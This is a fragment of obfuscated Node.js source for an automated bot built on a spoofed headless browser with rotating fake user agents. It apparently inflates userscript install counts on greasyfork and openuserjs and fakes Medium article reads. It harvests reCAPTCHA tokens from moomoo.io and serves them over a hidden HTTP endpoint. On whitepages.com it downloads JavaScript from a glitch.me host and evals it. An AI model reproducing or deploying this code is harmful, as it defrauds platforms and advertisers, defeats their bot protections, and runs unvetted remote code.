      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + V(0xd) + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + W(0xb, 't&sZ') + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': X(0x16) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + W(0x13, 'XqxX') + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + X(0x1) + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + X(0x5) + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + W(0x10, '6mwG') + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    X(0x19) + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + X(0x8) + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + W(0x2, '&AR$'),
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x9d7 + 0x1801 + -0x21d8
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Y = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f[(Y(0x1c))]()['displayUse' + 'rActionLay' + 'er'](0x1a * 0x154 + 0x21d5 + -0x445d)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x20c1 + 0x6ad + 0x1a78), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x737 * 0x4 + -0x2 * -0x56b + -0x274e), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x9f8 * -0x1 + -0x4 * 0x566 + -0x1f0 * -0x6;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x623 + -0x1395 + 0x19b8; w < getRandomInt(-0xe1d * 0x2 + -0x17a8 + 0x33e3 * 0x1, -0x197a + 0x13b * 0x1 + -0x1844 * -0x1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1feb * 0x7 + 0x118aa + -0x10db7);
        }
      }();
    }, 0x361 * 0x4 + -0x283 * -0x1 + -0xfa3 * 0x1), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Z = c;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x6 * -0x2fd + 0xaa6 + 0x2 * 0x3a4;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y[Z(0x21)](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x3f1 * -0x1 + 0x75b * 0x2 + -0x12a7, 0x30c + -0x26fc + 0x19 * 0x172)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xc819 + 0x6c41 + 0x5f95 * -0x2);
    }, 0x1 * -0x1ae9 + 0x1 * -0x228f + 0x3ddc), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x3 * 0x23 + 0x1 * -0x2393 + -0x283 * -0xe;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1c * -0x131 + -0x122d + -0x377), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x2 * -0x63e + 0x16f4 + 0x218 * -0x5), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x3a17f + 0x19683c + -0x57 * 0x17ab);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1d4f + 0x8 * -0x43c + 0x3f93);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x647 * 0x1 + -0x2220 + -0x98b * -0x3);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x356b + -0x1485 * 0x1 + -0x156);
}
doFlags['doOUJS'] && ((async () => {
  const a4 = d;
  async function f() {
    const a3 = c,
      a2 = d,
      a1 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1a61 + -0x2543 + 0x3 * 0x1537) {
        const a0 = d;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x6e8 + 0x2667 + -0x2d4e));
        const C = A[a0(0x11)]('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x20d1 * 0x1 + 0x1954 + 0x77d, D['indexOf']('\x20'));
        return B ? E['slice'](0x603 + 0xa30 + -0x1033, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x34ff + -0x214c + 0x7d5b),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + a1(0x3, 'werb') + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0xbd * 0x3 + -0x178c + 0x3c65 * 0x1),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y[a2(0x1b)], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + a3(0xe) + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + a4(0x22) + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
